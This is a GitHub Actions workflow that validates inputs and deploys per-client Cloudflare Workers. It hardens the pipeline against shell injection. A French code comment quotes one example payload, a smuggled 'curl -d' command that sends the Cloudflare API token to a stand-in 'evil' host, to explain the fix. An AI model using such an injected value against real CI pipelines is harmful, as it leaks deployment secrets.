name: Deploy — Client Atelier

on:
  workflow_dispatch:
    inputs:
      worker_name:
        description: 'Nom du Worker Cloudflare (ex: atelier-weber)'
        required: true
        type: string
  workflow_call:
    inputs:
      worker_name:
        required: true
        type: string

permissions:
  contents: read
  actions: read

concurrency:
  group: deploy-${{ inputs.worker_name }}
  cancel-in-progress: false

jobs:
  deploy:
    name: Build & Deploy ${{ inputs.worker_name }}
    if: github.ref == 'refs/heads/main'
    env:
      WORKER_NAME: ${{ inputs.worker_name }}
    runs-on: ubuntu-latest
    environment: Atelier CDF
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          ref: ${{ github.sha }}

      - name: Verify exact successful CI and current main
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          current_main="$(gh api "repos/$GITHUB_REPOSITORY/git/ref/heads/main" --jq '.object.sha')"
          [[ "$current_main" == "$GITHUB_SHA" ]] || { echo "Stale release: main has advanced." >&2; exit 1; }
          conclusion="$(gh run list --repo "$GITHUB_REPOSITORY" --workflow ci.yml --commit "$GITHUB_SHA" --branch main --event push --status success --limit 1 --json conclusion --jq '.[0].conclusion')"
          [[ "$conclusion" == success ]] || { echo "Successful CI required for this exact commit." >&2; exit 1; }

      - name: Resolve target configuration
        id: target
        run: |
          [[ "$WORKER_NAME" =~ ^[a-z0-9][a-z0-9-]{1,62}$ ]] || { echo "Invalid Worker name." >&2; exit 1; }
          case "$WORKER_NAME" in
            atelier-app) secret_name=ATELIER_APP_ENV ;;
            orsayn-cockpit) secret_name=COCKPIT_ENV ;;
            *) worker_key="${WORKER_NAME//-/_}"; secret_name="CLIENT_ENV_$(printf '%s' "$worker_key" | tr '[:lower:]' '[:upper:]')" ;;
          esac
          printf 'secret_name=%s\n' "$secret_name" >> "$GITHUB_OUTPUT"

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: '24'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Load target build and preflight configuration
        env:
          TARGET_ENV: ${{ secrets[steps.target.outputs.secret_name] }}
          TARGET_SECRET_NAME: ${{ steps.target.outputs.secret_name }}
        run: |
          [[ -n "$TARGET_ENV" ]] || { echo "Missing target environment secret $TARGET_SECRET_NAME." >&2; exit 1; }
          umask 077
          printf '%s\n' "$TARGET_ENV" > ".env.client-$WORKER_NAME"

      - name: Check quote attachment identity schema
        run: |
          if [[ "$WORKER_NAME" != "orsayn-cockpit" ]]; then
            node scripts/quote-attachment-cutover.mjs "$WORKER_NAME" --check
          fi

      - name: Build & Deploy
        env:
          WORKER_NAME: ${{ inputs.worker_name }}
          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
        # L'input est lu depuis `env` et validé AVANT le shell : interpolé
        # directement, un `x; curl -d "$CLOUDFLARE_API_TOKEN" https://evil/`
        # s'exécutait avec le token Cloudflare du workflow.
        run: node --env-file=".env.client-$WORKER_NAME" -e 'require("node:child_process").execFileSync("./scripts/deploy-client.sh", [process.env.WORKER_NAME], {stdio:"inherit"})'

      - name: Remove temporary target configuration
        if: always()
        run: |
          if [[ "$WORKER_NAME" =~ ^[a-z0-9][a-z0-9-]{1,62}$ ]]; then
            rm -f ".env.client-$WORKER_NAME"
          fi
